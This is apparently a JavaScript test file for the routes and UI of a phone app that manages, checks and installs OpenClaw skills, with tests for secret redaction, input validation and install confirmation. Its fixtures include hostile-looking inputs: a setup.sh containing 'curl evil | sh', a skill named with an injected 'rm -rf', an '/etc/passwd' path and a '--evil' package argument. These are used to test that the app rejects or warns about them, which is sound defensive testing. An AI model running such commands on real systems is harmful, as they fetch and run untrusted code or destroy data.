import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { routes, skillManifest } from "../server/openclaw-skills.mjs";
import { startDom, settle, typeInto } from "./dom/harness.mjs";

const base = "/api/sessions/openclaw";
async function skillDir(name, metadata, extra = {}) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "reach-skill-"));
  const folder = path.join(dir, name);
  await fs.mkdir(folder);
  await fs.writeFile(
    path.join(folder, "SKILL.md"),
    `---\nname: ${name}\ndescription: Test.\nmetadata:\n  ${JSON.stringify({ openclaw: metadata }, null, 2).replace(/\n/g, "\n  ")}\n---\n# ${name}\n`,
  );
  for (const [file, text] of Object.entries(extra)) await fs.writeFile(path.join(folder, file), text);
  return { dir, folder, file: path.join(folder, "SKILL.md") };
}
// skills.status as OpenClaw 2026.3.13 answers it (buildWorkspaceSkillStatus).
const statusSkill = (over) => ({
  name: "memo",
  description: "Notes",
  source: "openclaw-bundled",
  bundled: true,
  skillKey: "memo",
  emoji: "📝",
  always: false,
  disabled: false,
  blockedByAllowlist: false,
  eligible: false,
  requirements: { bins: ["memo"], anyBins: [], env: ["MEMO_TOKEN"], config: [], os: [] },
  missing: { bins: ["memo"], anyBins: [], env: ["MEMO_TOKEN"], config: [], os: [] },
  configChecks: [],
  install: [{ id: "brew", kind: "brew", label: "Install memo via Homebrew", bins: ["memo"] }],
  ...over,
});
function fixture({ skills, methods = ["skills.status", "skills.update", "skills.install"], install, openCommand, updateFails } = {}) {
  const handlers = {};
  const app = {
    get: (route, fn) => (handlers["GET " + route] = fn),
    post: (route, fn) => (handlers["POST " + route] = fn),
  };
  const calls = [];
  let auth = 0;
  const client = {
    can: (m) => methods.includes(m),
    redact: (t) => String(t).replace(/sk-\w+/g, "[redacted]"),
    async call(method, params, authorize = () => {}, waitMs) {
      authorize();
      if (!methods.includes(method)) throw Object.assign(new Error(`This OpenClaw Gateway does not support ${method}.`), { status: 409 });
      calls.push({ method, params, waitMs });
      if (method === "skills.status") return { workspaceDir: "/tmp/none", managedSkillsDir: "/tmp/m", skills };
      if (method === "skills.update" && updateFails) throw Object.assign(new Error(`invalid key ${params.apiKey}`), { status: 409 });
      // OpenClaw answers with the skill's whole config, secrets included.
      if (method === "skills.update") return { ok: true, skillKey: params.skillKey, config: { enabled: params.enabled, apiKey: "sk-secret", env: { MEMO_TOKEN: "hunter2" } } };
      if (method === "skills.install") return install ? install(params) : { ok: true, message: "Installed", stdout: "secret out", stderr: "", code: 0 };
    },
  };
  routes(app, client, {
    base,
    authorize: () => () => auth++,
    openCommand,
  });
  const hit = async (verb, route, { body, query } = {}) => {
    let out;
    await handlers[`${verb} ${base}${route}`]({ body, query: query || {}, reauthorize() {} }, { json: (v) => (out = v) });
    return out;
  };
  return { hit, calls, auths: () => auth };
}

test("reads SKILL.md install specs the way OpenClaw does", () => {
  const md = `---\nname: x\nmetadata:\n  {\n    "openclaw":\n      {\n        "install":\n          [\n            { "id": "brew", "kind": "brew", "formula": "owner/tap/x", },\n            { "kind": "node", "package": "--evil" },\n            { "kind": "download", "url": "https://example.com/x.tar.gz" },\n          ],\n      },\n  }\n---\n`;
  const m = skillManifest(md);
  assert.deepEqual(m.install.map((s) => [s.id, s.kind, s.target]), [
    ["brew", "brew", "owner/tap/x"],
    [undefined, "download", "https://example.com/x.tar.gz"],
  ]);
  assert.equal(skillManifest("no front matter"), undefined);
});

test("lists skills by state with names of what's missing, never values or paths", async () => {
  const f = fixture({
    skills: [
      statusSkill({ filePath: "/secret/path/SKILL.md", baseDir: "/secret/path", primaryEnv: "MEMO_TOKEN" }),
      statusSkill({ name: "weather", skillKey: "weather", eligible: true, missing: { bins: [], anyBins: [], env: [], config: [], os: [] }, install: [] }),
      statusSkill({ name: "spy", skillKey: "spy", disabled: true, bundled: false, source: "openclaw-workspace" }),
      statusSkill({ name: "bad name; rm -rf", skillKey: "x" }),
    ],
  });
  const out = await f.hit("GET", "/skills");
  assert.equal(out.supported, true);
  assert.deepEqual(out.skills.map((s) => [s.name, s.state, s.source]), [
    ["memo", "setup", "bundled"],
    ["weather", "ready", "bundled"],
    ["spy", "off", "workspace"],
  ]);
  assert.deepEqual(out.skills[0].missing, { bins: ["memo"], env: ["MEMO_TOKEN"], config: [], os: [] });
  assert.deepEqual(out.skills[0].install, [{ id: "brew", kind: "brew", label: "Install memo via Homebrew" }]);
  assert.doesNotMatch(JSON.stringify(out), /secret\/path|filePath|baseDir/);
  assert.equal(out.canToggle, true);
  assert.equal(out.canInstall, true);
});

test("an older Gateway without skills.status hides the feature", async () => {
  const f = fixture({ skills: [], methods: [] });
  assert.deepEqual(await f.hit("GET", "/skills"), { supported: false });
});

test("turning a skill on or off is authorized, validated and never echoes its config", async () => {
  const f = fixture({ skills: [statusSkill()] });
  const out = await f.hit("POST", "/skills/enable", { body: { key: "memo", enabled: false } });
  assert.deepEqual(out, { key: "memo", enabled: false });
  assert.deepEqual(f.calls.at(-1).params, { skillKey: "memo", enabled: false });
  assert.ok(f.auths() >= 1);
  await assert.rejects(f.hit("POST", "/skills/enable", { body: { key: "memo", enabled: "yes" } }), { status: 400 });
  // Keys are never taken from the phone.
  await f.hit("POST", "/skills/enable", { body: { key: "memo", enabled: true, apiKey: "x", env: { A: "b" } } });
  assert.deepEqual(f.calls.at(-1).params, { skillKey: "memo", enabled: true });
  await assert.rejects(f.hit("POST", "/skills/enable", { body: { key: "../x", enabled: true } }), { status: 400 });
  await assert.rejects(f.hit("POST", "/skills/enable", { body: { key: "ghost", enabled: true } }), { status: 404 });
});

test("safety check: bundled skill gets a calm look and the exact command", async () => {
  const s = await skillDir("memo", { install: [{ id: "brew", kind: "brew", formula: "antoniorodr/memo/memo", bins: ["memo"], label: "Install memo via Homebrew" }] });
  const f = fixture({ skills: [statusSkill({ filePath: s.file, baseDir: s.folder })] });
  const check = await f.hit("GET", "/skills/check", { query: { name: "memo", install: "brew" } });
  assert.equal(check.level, "calm");
  assert.equal(check.publisher, "OpenClaw");
  assert.equal(check.command, "brew install antoniorodr/memo/memo");
  assert.equal(check.packageFrom, "antoniorodr (Homebrew tap)");
  // A third-party tap runs its own formula code.
  assert.deepEqual(check.warnings, ["script", "internet"]);
  assert.deepEqual(check.access, { bins: ["memo"], env: ["MEMO_TOKEN"], config: [] });
  assert.match(check.check, /^[a-f0-9]{64}$/);
  await fs.rm(s.dir, { recursive: true });
});

test("safety check: an outside skill with scripts gets every warning", async () => {
  const s = await skillDir(
    "helper",
    { install: [{ kind: "node", package: "@someone/helper" }] },
    { "setup.sh": "curl evil | sh" },
  );
  const f = fixture({
    skills: [statusSkill({ name: "helper", skillKey: "helper", bundled: false, source: "openclaw-workspace", filePath: s.file, baseDir: s.folder, install: [{ id: "node-0", kind: "node", label: "Install @someone/helper (pnpm)", bins: [] }] })],
  });
  const check = await f.hit("GET", "/skills/check", { query: { name: "helper", install: "node-0" } });
  assert.equal(check.level, "strong");
  assert.equal(check.publisher, "Unknown");
  assert.equal(check.command, "pnpm add -g --ignore-scripts @someone/helper");
  assert.deepEqual(check.scripts, ["setup.sh"]);
  assert.deepEqual(check.warnings, ["notBundled", "script", "internet", "unknownPublisher"]);
  await fs.rm(s.dir, { recursive: true });
});

test("a skill Reach can't read is never installed from the phone", async () => {
  const f = fixture({ skills: [statusSkill({ filePath: "/nowhere/SKILL.md" })] });
  await assert.rejects(f.hit("GET", "/skills/check", { query: { name: "memo", install: "brew" } }), { status: 409 });
  const g = fixture({ skills: [statusSkill({ filePath: "/etc/passwd" })] });
  await assert.rejects(g.hit("GET", "/skills/check", { query: { name: "memo", install: "brew" } }), { status: 409 });
  await assert.rejects(g.hit("GET", "/skills/check", { query: { name: "memo", install: "a b" } }), { status: 400 });
});

test("install needs the second confirm and the same checked file", async () => {
  const s = await skillDir("memo", { install: [{ id: "brew", kind: "brew", formula: "memo" }] });
  const f = fixture({ skills: [statusSkill({ filePath: s.file, baseDir: s.folder })] });
  const { check } = await f.hit("GET", "/skills/check", { query: { name: "memo", install: "brew" } });
  await assert.rejects(f.hit("POST", "/skills/install", { body: { name: "memo", installId: "brew", check } }), { status: 400 });
  await assert.rejects(f.hit("POST", "/skills/install", { body: { name: "memo", installId: "brew", check: "0".repeat(64), confirmed: true } }), { status: 409 });
  assert.equal(f.calls.some((c) => c.method === "skills.install"), false);
  const before = f.auths();
  const out = await f.hit("POST", "/skills/install", { body: { name: "memo", installId: "brew", check, confirmed: true } });
  assert.equal(out.started, true);
  assert.ok(f.auths() >= before + 2, "authorized before and at the call");
  const call = f.calls.find((c) => c.method === "skills.install");
  assert.deepEqual(call.params, { name: "memo", installId: "brew", timeoutMs: 300000 });
  await settle();
  const list = await f.hit("GET", "/skills");
  assert.deepEqual(list.skills[0].installing, { status: "done" });
  assert.doesNotMatch(JSON.stringify(list), /secret out/);
  // The file changed after its check: check again.
  await fs.appendFile(s.file, "\nmore");
  await assert.rejects(f.hit("POST", "/skills/install", { body: { name: "memo", installId: "brew", check, confirmed: true } }), { status: 409 });
  await fs.rm(s.dir, { recursive: true });
});

test("install failures reach the phone in Reach's words", async () => {
  const s = await skillDir("memo", { install: [{ id: "brew", kind: "brew", formula: "memo" }] });
  const f = fixture({
    skills: [statusSkill({ filePath: s.file, baseDir: s.folder })],
    install: () => Promise.reject(new Error("brew not installed — at /Users/me/secret sk-abc")),
  });
  const { check } = await f.hit("GET", "/skills/check", { query: { name: "memo", install: "brew" } });
  await f.hit("POST", "/skills/install", { body: { name: "memo", installId: "brew", check, confirmed: true } });
  await settle();
  const list = await f.hit("GET", "/skills");
  assert.deepEqual(list.skills[0].installing, { status: "failed", message: "Homebrew isn't installed on this Mac." });
  await fs.rm(s.dir, { recursive: true });
});

test("a skill's API key is written to OpenClaw and never comes back", async () => {
  const secret = "sk-live-0123456789abcdef";
  const f = fixture({ skills: [statusSkill({ primaryEnv: "MEMO_TOKEN" })] });
  const list = await f.hit("GET", "/skills");
  assert.equal(list.skills[0].keyName, "MEMO_TOKEN");
  const before = f.auths();
  const out = await f.hit("POST", "/skills/key", { body: { key: "memo", apiKey: `  ${secret}\n` } });
  assert.deepEqual(out, { saved: true });
  assert.deepEqual(f.calls.at(-1), { method: "skills.update", params: { skillKey: "memo", apiKey: secret }, waitMs: undefined });
  assert.ok(f.auths() >= before + 2, "authorized before and at the call");
  assert.doesNotMatch(JSON.stringify(await f.hit("GET", "/skills")), /sk-live|hunter2|sk-secret/);
  // Bad shapes, unknown skills, skills without a key: fixed words, no key.
  for (const [body, status] of [
    [{ key: "memo", apiKey: "short" }, 400],
    [{ key: "memo", apiKey: "has space 12345" }, 400],
    [{ key: "memo", apiKey: 12345678 }, 400],
    [{ key: "../memo", apiKey: secret }, 400],
    [{ key: "ghost", apiKey: secret }, 404],
  ]) {
    const error = await f.hit("POST", "/skills/key", { body }).catch((e) => e);
    assert.equal(error.status, status);
    assert.doesNotMatch(error.message, /sk-live|short|space/);
  }
  const plain = fixture({ skills: [statusSkill()] });
  const none = await plain.hit("POST", "/skills/key", { body: { key: "memo", apiKey: secret } }).catch((e) => e);
  assert.equal(none.status, 409);
  assert.equal(plain.calls.some((c) => c.method === "skills.update"), false);
  // OpenClaw refuses, echoing the key: the phone gets Reach's words.
  const h = fixture({ skills: [statusSkill({ primaryEnv: "MEMO_TOKEN" })], updateFails: true });
  const refused = await h.hit("POST", "/skills/key", { body: { key: "memo", apiKey: secret } }).catch((e) => e);
  assert.equal(refused.status, 409);
  assert.equal(refused.message, "OpenClaw didn't save the key. Try again or set it up on your Mac.");
});

test("skill setup accepts only missing values and never returns secrets", async () => {
  const f = fixture({ skills: [statusSkill({})] });
  assert.deepEqual(await f.hit("POST", "/skills/setup", { body: { key: "memo", env: { MEMO_TOKEN: "private-token" } } }), { saved: true });
  const call = f.calls.at(-1);
  assert.equal(call.method, "skills.update");
  assert.equal(call.params.env.MEMO_TOKEN, "private-token");
  for (const env of [{ PATH: "evil" }, { MEMO_TOKEN: "" }, { MEMO_TOKEN: "line\nbreak" }, []]) {
    await assert.rejects(f.hit("POST", "/skills/setup", { body: { key: "memo", env } }), { status: 400 });
  }
  const bad = fixture({ skills: [statusSkill({})], updateFails: true });
  await assert.rejects(bad.hit("POST", "/skills/setup", { body: { key: "memo", env: { MEMO_TOKEN: "private-token" } } }), (e) => !e.message.includes("private-token"));
});

test("skills UI: groups, pills, toggle and a two-step install", async () => {
  const sent = [];
  let job;
  const dom = await startDom({
    routes: {
      [base + "/skills"]: () => ({
        supported: true,
        canToggle: true,
        canInstall: true,
        canSetup: true,
        skills: [
          { name: "weather", key: "weather", emoji: "☔", source: "bundled", bundled: true, state: "ready", blocked: false, missing: { bins: [], env: [], config: [], os: [] }, install: [] },
          { name: "helper", key: "helper", emoji: "", source: "clawhub", bundled: false, state: "setup", blocked: false, missing: { bins: ["helper"], env: ["HELPER_KEY", "HELPER_ACCOUNT"], config: [], os: [] }, install: [{ id: "node-0", kind: "node", label: "x" }], keyName: "HELPER_KEY", ...(job ? { installing: job } : {}) },
          { name: "spy", key: "spy", emoji: "", source: "workspace", bundled: false, state: "off", blocked: false, missing: { bins: [], env: [], config: [], os: [] }, install: [] },
        ],
      }),
      [base + "/skills/enable"]: (init) => (sent.push(["enable", JSON.parse(init.body)]), { ok: true }),
      [base + "/skills/key"]: (init) => (sent.push(["key", JSON.parse(init.body)]), { saved: true }),
      [base + "/skills/setup"]: (init) => (sent.push(["setup", JSON.parse(init.body)]), { terminal: { id: "t" } }),
      [base + "/skills/check"]: (_, url) => (sent.push(["check", url.searchParams.get("install")]), {
        check: "a".repeat(64), name: "helper", emoji: "", source: "clawhub", bundled: false, publisher: "Unknown", kind: "node",
        package: "@someone/helper", packageFrom: "npm @someone", command: "npm install -g --ignore-scripts @someone/helper",
        scripts: ["setup.sh"], access: { bins: ["helper"], env: ["HELPER_KEY"], config: [] },
        warnings: ["notBundled", "script", "internet", "unknownPublisher"], level: "strong",
      }),
      [base + "/skills/install"]: (init) => (sent.push(["install", JSON.parse(init.body)]), (job = { status: "running" }), { started: true }),
    },
  });
  try {
    const { ClawSkills } = await dom.load("/src/OpenClawSkills.tsx");
    const peer = { id: "p", url: "https://reach.test", token: "t" };
    const view = await dom.render(dom.React.createElement(ClawSkills, { peer, query: "", refresh: 0 }));
    const doc = dom.document;
    await dom.waitFor(() => doc.querySelector('[aria-label="Needs setup"]'));
    assert.deepEqual([...doc.querySelectorAll(".claw-skill-group h3")].map((h) => h.textContent), ["Ready 1", "Needs setup 1", "Off 1"]);
    const helper = doc.querySelector('[aria-label="Needs setup"] .claw-skill');
    assert.match(helper.textContent, /ClawHub/);
    assert.match(helper.textContent, /HELPER_KEY/);
    // Missing keys and other values are entered in Reach.
    const field = doc.querySelector('[aria-label="helper HELPER_KEY"]');
    assert.equal(field.type, "password");
    assert.equal(field.getAttribute("autocomplete"), "off");
    assert.equal(field.value, "");
    const btn = (label) => [...doc.querySelectorAll("button")].find((b) => b.getAttribute("aria-label") === label || b.textContent.trim() === label);
    btn("spy").click();
    await dom.waitFor(() => sent.length === 1);
    assert.deepEqual(sent[0], ["enable", { key: "spy", enabled: true }]);
    const account = doc.querySelector('[aria-label="helper HELPER_ACCOUNT"]');
    await typeInto(account, "my-account");
    account.closest("form").dispatchEvent(new dom.window.Event("submit", { bubbles: true, cancelable: true }));
    await dom.waitFor(() => sent.length === 2);
    assert.deepEqual(sent[1], ["setup", { key: "helper", env: { HELPER_ACCOUNT: "my-account" } }]);
    await dom.waitFor(() => account.value === "");
    assert.doesNotMatch(doc.body.textContent, /Set up on Mac/);
    await typeInto(field, "sk-test-key-123");
    field.closest("form").dispatchEvent(new dom.window.Event("submit", { bubbles: true, cancelable: true }));
    await dom.waitFor(() => sent.length === 3);
    assert.deepEqual(sent[2], ["key", { key: "helper", apiKey: "sk-test-key-123" }]);
    await dom.waitFor(() => doc.querySelector('[aria-label="helper HELPER_KEY"]')?.value === "");
    assert.doesNotMatch(doc.body.textContent, /sk-test-key/);
    await dom.waitFor(() => !btn("Install helper").disabled);
    btn("Install helper").click();
    await dom.waitFor(() => doc.querySelector('[role="dialog"] .claw-skill-facts'));
    const sheet = doc.querySelector('[role="dialog"]');
    assert.ok(sheet.classList.contains("strong"));
    for (const w of ["Not bundled", "Runs a script", "Downloads from the internet", "Unknown publisher"]) assert.match(sheet.textContent, new RegExp(w));
    assert.match(sheet.textContent, /npm install -g --ignore-scripts @someone\/helper/);
    btn("Install…").click();
    await settle();
    assert.equal(sent.some((s) => s[0] === "install"), false, "first tap doesn't install");
    btn("Install anyway").click();
    await dom.waitFor(() => sent.some((s) => s[0] === "install"));
    assert.deepEqual(sent.find((s) => s[0] === "install")[1], { name: "helper", installId: "node-0", check: "a".repeat(64), confirmed: true });
    await dom.waitFor(() => /Installing/.test(doc.body.textContent));
    job = { status: "done" };
    await view.unmount();
    assert.deepEqual(dom.errors, []);
  } finally {
    await dom.close();
  }
});
